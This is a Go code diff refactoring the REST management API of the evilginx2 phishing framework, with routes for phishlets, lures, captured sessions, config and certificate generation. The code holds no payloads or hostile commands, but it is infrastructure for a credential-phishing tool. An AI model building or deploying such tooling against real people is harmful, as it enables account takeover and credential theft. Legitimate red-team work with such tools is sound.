@@ -2,17 +2,22 @@ package api
 
 import (
 	"context"
+	"fmt"
 	"net/http"
 	"time"
 
 	"github.com/gin-gonic/gin"
 	"github.com/kgretzky/evilginx2/internal/phishlet"
 	"github.com/kgretzky/evilginx2/internal/storage"
+	"github.com/kgretzky/evilginx2/pkg/models"
 )
 
 type Server struct {
 	router       *gin.Engine
 	storage      storage.Interface
+	config       *models.Config
+	port         string
+	server       *http.Server
 	phishletRepo *phishlet.PhishletRepository
 	handlers     *Handlers
 }
@@ -22,117 +27,129 @@ type Handlers struct {
 	phishletRepo *phishlet.PhishletRepository
 }
 
-func NewServer(storage storage.Interface, phishletRepo *phishlet.PhishletRepository) *Server {
+func NewServer(storage storage.Interface, config *models.Config, port string, phishletRepo *phishlet.PhishletRepository) *Server {
 	gin.SetMode(gin.ReleaseMode)
-	router := gin.New()
-	router.Use(gin.Logger())
-	router.Use(gin.Recovery())
-	router.Use(corsMiddleware())
-
+	
 	handlers := &Handlers{
 		storage:      storage,
 		phishletRepo: phishletRepo,
 	}
-
-	server := &Server{
-		router:       router,
+	
+	s := &Server{
+		router:       gin.Default(),
 		storage:      storage,
+		config:       config,
+		port:         port,
 		phishletRepo: phishletRepo,
 		handlers:     handlers,
 	}
+	
+	s.setupMiddleware()
+	s.setupRoutes()
+	
+	return s
+}
 
-	server.setupRoutes()
-	return server
+func (s *Server) setupMiddleware() {
+	s.router.Use(gin.Recovery())
+	s.router.Use(func(c *gin.Context) {
+		c.Header("Content-Type", "application/json")
+		c.Next()
+	})
+	
+	s.router.Use(func(c *gin.Context) {
+		start := time.Now()
+		c.Next()
+		duration := time.Since(start)
+		
+		fmt.Printf("[API] %s %s - %d (%v)\n", 
+			c.Request.Method, 
+			c.Request.URL.Path, 
+			c.Writer.Status(), 
+			duration)
+	})
 }
 
 func (s *Server) setupRoutes() {
 	api := s.router.Group("/api/v1")
 	
+	api.GET("/health", s.healthCheck)
+	
 	phishlets := api.Group("/phishlets")
-	{
-		phishlets.GET("", s.handlers.listPhishlets)
-		phishlets.POST("", s.handlers.createPhishlet)
-		phishlets.GET("/:name", s.handlers.getPhishlet)
-		phishlets.PUT("/:name", s.handlers.updatePhishlet)
-		phishlets.DELETE("/:name", s.handlers.deletePhishlet)
-		
-		phishlets.GET("/:name/versions", s.handlers.listPhishletVersions)
-		phishlets.POST("/:name/versions", s.handlers.createPhishletVersion)
-		phishlets.GET("/:name/versions/:version", s.handlers.getPhishletVersion)
-		phishlets.POST("/:name/conditions/evaluate", s.handlers.evaluateConditions)
-		phishlets.GET("/:name/flows", s.handlers.getMultiPageFlows)
-		phishlets.POST("/:name/flows/:flow/step", s.handlers.updateFlowStep)
-	}
-
+	phishlets.GET("", s.listPhishlets)
+	phishlets.POST("", s.createPhishlet)
+	phishlets.GET("/:name", s.getPhishlet)
+	phishlets.PUT("/:name", s.updatePhishlet)
+	phishlets.DELETE("/:name", s.deletePhishlet)
+	phishlets.GET("/:name/stats", s.getPhishletStats)
+	
+	phishlets.GET("/:name/versions", s.handlers.listPhishletVersions)
+	phishlets.POST("/:name/versions", s.handlers.createPhishletVersion)
+	phishlets.GET("/:name/versions/:version", s.handlers.getPhishletVersion)
+	phishlets.POST("/:name/conditions/evaluate", s.handlers.evaluateConditions)
+	phishlets.GET("/:name/flows", s.handlers.getMultiPageFlows)
+	phishlets.POST("/:name/flows/:flow/step", s.handlers.updateFlowStep)
+	
 	sessions := api.Group("/sessions")
-	{
-		sessions.GET("", s.handlers.listSessions)
-		sessions.POST("", s.handlers.createSession)
-		sessions.GET("/:id", s.handlers.getSession)
-		sessions.PUT("/:id", s.handlers.updateSession)
-		sessions.DELETE("/:id", s.handlers.deleteSession)
-	}
-
-	lures := api.Group("/lures")
-	{
-		lures.GET("", s.handlers.listLures)
-		lures.POST("", s.handlers.createLure)
-		lures.GET("/:id", s.handlers.getLure)
-		lures.PUT("/:id", s.handlers.updateLure)
-		lures.DELETE("/:id", s.handlers.deleteLure)
-	}
-
+	sessions.GET("", s.listSessions)
+	sessions.POST("", s.createSession)
+	sessions.GET("/:id", s.getSession)
+	sessions.PUT("/:id", s.updateSession)
+	sessions.DELETE("/:id", s.deleteSession)
+	sessions.GET("/stats", s.getSessionStats)
+	
 	config := api.Group("/config")
-	{
-		config.GET("", s.handlers.getConfig)
-		config.POST("", s.handlers.setConfig)
-		config.DELETE("/:key", s.handlers.deleteConfig)
-	}
-
+	config.GET("", s.getConfig)
+	config.PUT("", s.updateConfig)
+	
+	lures := api.Group("/lures")
+	lures.GET("", s.listLures)
+	lures.POST("", s.createLure)
+	lures.GET("/:id", s.getLure)
+	lures.PUT("/:id", s.updateLure)
+	lures.DELETE("/:id", s.deleteLure)
+	
 	certificates := api.Group("/certificates")
-	{
-		certificates.GET("", s.handlers.listCertificates)
-		certificates.POST("", s.handlers.createCertificate)
-		certificates.GET("/:domain", s.handlers.getCertificate)
-		certificates.DELETE("/:domain", s.handlers.deleteCertificate)
-	}
-
-	s.router.GET("/health", func(c *gin.Context) {
-		c.JSON(http.StatusOK, gin.H{"status": "ok"})
-	})
+	certificates.GET("", s.listCertificates)
+	certificates.POST("/generate", s.generateCertificate)
+	certificates.DELETE("/:domain", s.deleteCertificate)
 }
 
-func (s *Server) Start(addr string) error {
-	return s.router.Run(addr)
-}
-
-func (s *Server) StartWithContext(ctx context.Context, addr string) error {
-	srv := &http.Server{
-		Addr:    addr,
+func (s *Server) Start(ctx context.Context) error {
+	s.server = &http.Server{
+		Addr:    ":" + s.port,
 		Handler: s.router,
 	}
-
+	
+	fmt.Printf("Starting API server on port %s\n", s.port)
+	
 	go func() {
 		<-ctx.Done()
 		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 		defer cancel()
-		srv.Shutdown(shutdownCtx)
+		s.server.Shutdown(shutdownCtx)
 	}()
-
-	return srv.ListenAndServe()
+	
+	if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+		return fmt.Errorf("failed to start server: %w", err)
+	}
+	
+	return nil
 }
 
-func corsMiddleware() gin.HandlerFunc {
-	return func(c *gin.Context) {
-		c.Header("Access-Control-Allow-Origin", "*")
-		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
-		c.Header("Access-Control-Allow-Headers", "Origin, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization")
-
-		if c.Request.Method == "OPTIONS" {
-			c.AbortWithStatus(204)
-			return
-		}
-
-		c.Next()
+func (s *Server) Stop() error {
+	if s.server != nil {
+		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		return s.server.Shutdown(ctx)
 	}
+	return nil
+}
+
+func (s *Server) healthCheck(c *gin.Context) {
+	c.JSON(http.StatusOK, gin.H{
+		"status":    "healthy",
+		"timestamp": time.Now().UTC(),
+		"version":   "1.0.0",
+	})
 }
